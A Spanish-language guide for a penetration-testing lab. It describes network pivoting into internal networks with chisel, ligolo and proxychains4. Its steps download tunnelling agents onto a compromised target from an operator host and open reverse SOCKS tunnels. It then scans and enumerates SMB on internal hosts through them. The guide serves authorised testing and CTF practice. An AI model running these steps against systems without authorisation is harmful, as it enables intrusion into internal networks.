# Guía de Pivoting y Redirección en SecLab-SBF

Este documento describe la arquitectura, herramientas y flujos de trabajo para **pivoting de red** y túneles dentro del laboratorio SecLab-SBF hacia entornos de prueba (TryHackMe, HackTheBox, evaluaciones de clientes).

---

## 1. Principios de Aislamiento y Red

El laboratorio opera bajo un modelo de privilegios mínimos:
1. **Contenedor seguro**: El servicio del laboratorio se ejecuta con `read_only: true`, `cap_drop: ALL`, `no-new-privileges: true` y bajo la cuenta `tester` (sin `sudo` ni password).
2. **Tráfico de salida acotado**: Cuando la VPN está activa (`VPN_MODE=inside`), el tráfico hacia las subredes del laboratorio o cliente sale a través de `tun0`.
3. **Pivoting en espacio de usuario**: Herramientas como `chisel` y `proxychains4` operan 100% en espacio de usuario (TCP/WebSockets/SOCKS5), sin requerir capacidades de kernel (`NET_ADMIN`), preservando las invariantes de seguridad del contenedor.

---

## 2. Herramientas Integradas

| Herramienta | Tipo | Ubicación en el Lab | Uso Principal |
|---|---|---|---|
| `chisel` | Binario Go (nativo) | `/usr/bin/chisel` | Túneles TCP/UDP y servidor SOCKS5 inverso sobre HTTP/WebSockets |
| `proxychains4` | Utilidad (C / LD_PRELOAD) | `/usr/bin/proxychains4` | Redirige herramientas TCP (`nmap -sT`, `nxc`, `curl`) vía SOCKS5/HTTP |
| `ligolo-proxy` | Binario Go (nativo) | `/usr/bin/ligolo-proxy` | Controlador de túneles Ligolo-ng |
| **Payloads de Pivoting** | Binarios precompilados | `/usr/local/share/seclab/payloads/pivoting/` | Agentes y clientes listos para transferir a objetivos comprometidos |

### Binarios precompilados para objetivos (`/usr/local/share/seclab/payloads/pivoting/`)
- `chisel_linux_amd64` (Linux x86_64)
- `chisel_linux_arm64` (Linux ARM64)
- `chisel_windows_amd64.exe` (Windows x86_64)
- `ligolo_agent_linux_amd64` (Linux x86_64)
- `ligolo_agent_linux_arm64` (Linux ARM64)
- `ligolo_agent_windows_amd64.exe` (Windows x86_64)

---

## 3. Flujo Típico con Chisel (Reverse SOCKS5)

El escenario clásico de CTF y pentest: obtienes acceso a una máquina frontera (dual-homed) con acceso a una red interna aislada.

### Paso 1: Iniciar el servidor Chisel en SecLab
Dentro de la sesión de `tester` (o ventana tmux):
```bash
chisel server --port 8000 --reverse
```
*El servidor escuchará en el puerto 8000 de la interfaz compartida (alcanzable por la máquina objetivo a través de la IP de `tun0`).*

Para conocer la IP de la VPN en el lab:
```bash
pt-vpn-ip
```

### Paso 2: Servir el binario Chisel hacia el objetivo
Desde otra ventana tmux:
```bash
python3 -m http.server -d /usr/local/share/seclab/payloads/pivoting 8888
```

En la máquina objetivo (según el SO):
- **Linux**:
  ```bash
  curl -s http://<IP_LAB_VPN>:8888/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel
  ```
- **Windows (PowerShell)**:
  ```powershell
  Invoke-WebRequest -Uri "http://<IP_LAB_VPN>:8888/chisel_windows_amd64.exe" -OutFile "$env:TEMP\chisel.exe"
  ```

### Paso 3: Conectar el cliente Chisel en modo Reverse SOCKS
En la máquina comprometida:
```bash
# En el objetivo
./chisel client <IP_LAB_VPN>:8000 R:1080:socks
```
*Esto crea un listener SOCKS5 en `127.0.0.1:1080` dentro de SecLab.*

### Paso 4: Ejecutar herramientas a través de `proxychains4`
SecLab incluye `/etc/proxychains4.conf` preconfigurado con `socks5 127.0.0.1 1080` y `quiet_mode`:
```bash
# Escaneo de puertos TCP a un host de la red interna
proxychains4 nmap -sT -Pn -p 22,80,445,3389 172.16.10.5

# Enumeracion SMB con NetExec
proxychains4 nxc smb 172.16.10.5 -u 'usuario' -p 'password'

# Solicitudes HTTP a servicios internos
proxychains4 curl -i http://172.16.10.5:8080/
```

> [!TIP]
> Al usar `nmap` con `proxychains4`, utiliza siempre `-sT` (TCP Connect Scan) y `-Pn` (sin ping ICMP), ya que los proxies SOCKS solo transportan flujos TCP establecidos.

---

## 4. Redirección de Puertos Específicos (Local / Remote Port Forwarding)

### Acceder a un puerto interno específico en SecLab
Si solo deseas mapear un servicio remoto (por ejemplo, base de datos en `172.16.10.20:3306`):
```bash
# En el objetivo
./chisel client <IP_LAB_VPN>:8000 R:3306:172.16.10.20:3306
```
Ahora en SecLab puedes conectarte directamente a `127.0.0.1:3306`:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

### Exponer un servicio de SecLab hacia la red remota
Si deseas que la red remota acceda a un listener o payload en SecLab:
```bash
# En el objetivo
./chisel client <IP_LAB_VPN>:8000 4444:127.0.0.1:4444
```

---

## 5. Configuración Personalizada de Proxychains

Si una prueba requiere una cadena o puerto distinto (por ejemplo, múltiples saltos o SSH dinamico en otro puerto):
1. Copia la plantilla al directorio del engagement en tu workspace:
   ```bash
   cp /etc/proxychains4.conf /workspace/mi-engagement/proxychains.conf
   ```
2. Edita la sección `[ProxyList]` en `/workspace/mi-engagement/proxychains.conf`.
3. Al ejecutar comandos dentro de esa carpeta, `proxychains4` detectará y utilizará `./proxychains.conf` de manera automática, o puedes especificar:
   ```bash
   export PROXYCHAINS_CONF_FILE=/workspace/mi-engagement/proxychains.conf
   ```
